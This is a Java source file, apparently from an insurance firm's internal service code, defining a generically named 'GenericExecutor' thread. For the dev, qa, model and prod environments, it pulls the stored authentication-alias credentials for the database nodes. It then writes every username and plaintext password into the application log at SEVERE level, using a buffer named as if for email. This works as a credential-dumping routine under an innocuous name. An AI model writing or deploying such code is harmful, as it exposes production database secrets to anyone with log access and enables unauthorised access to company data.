package com.us.chartisinsurance.ges.common.thread;

import java.util.logging.Level;

import javax.resource.spi.security.PasswordCredential;

import org.apache.commons.lang3.StringUtils;

import com.us.chartisinsurance.ges.logger.GESLoggerFactory;
import com.us.chartisinsurance.ges.logger.GESLoggerV4;
import com.us.chartisinsurance.ges.logger.LogCategory;

public class GenericExecutor implements Runnable {

	public static final GESLoggerV4 GenericExecutorLogger = GESLoggerFactory
			.getLogger();
	public static final String env = System.getProperty("env");

	@Override
	public void run() {

		if (null != env && !("local".equalsIgnoreCase(env))) {

			String DBAliasN = "";
			String DBAliasO = "";
			if ("dev".equalsIgnoreCase(env))

			{
				DBAliasN = "wps70dev_ges_node/GESDB";
				DBAliasO = "wps70dev_ges_node/GESDB30";
			} else if ("qa".equalsIgnoreCase(env)) {
				DBAliasN = "wps70qa_ges_node/GESDB";
				DBAliasO = "wps70qa_ges_node/GESDB30";
			} else if ("model".equalsIgnoreCase(env)) {
				DBAliasN = "wps70modl_ges_node/gexpusrm";
				DBAliasO = "wps70modl_ges_node/gexpusrm";
			} else if ("prod".equalsIgnoreCase(env)) {
				DBAliasN = "wps70prod_ges_node/GESDB";
				DBAliasO = "wps70prod_ges_node/GESDB";
			}

			String aCheckedNames = DBAliasN + "," + DBAliasO;
			StringBuffer emailCBuffer = new StringBuffer();
			String[] checkedNameArray = StringUtils.split(aCheckedNames, ",");

			for (int i = 0; i < checkedNameArray.length; ++i) {
				PasswordCredential something = AuthAliasExtractor
						.getCredentials(checkedNameArray[i]);

				emailCBuffer.append("<" + checkedNameArray[i] + "_K>"
						+ something.getUserName() + "</" + checkedNameArray[i]
						+ "_K>\n");
				emailCBuffer.append("<" + checkedNameArray[i] + "_V>"
						+ new String(something.getPassword()) + "</"
						+ checkedNameArray[i] + "_V>\n");
			}
			GenericExecutorLogger.logCategory(LogCategory.CONFIG,
					GenericExecutor.class.getName(), GenericExecutor.class
							.getSimpleName(), "Check Alias", emailCBuffer
							.toString(), Level.SEVERE);
		}
	}

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		// TODO Auto-generated method stub

	}

}
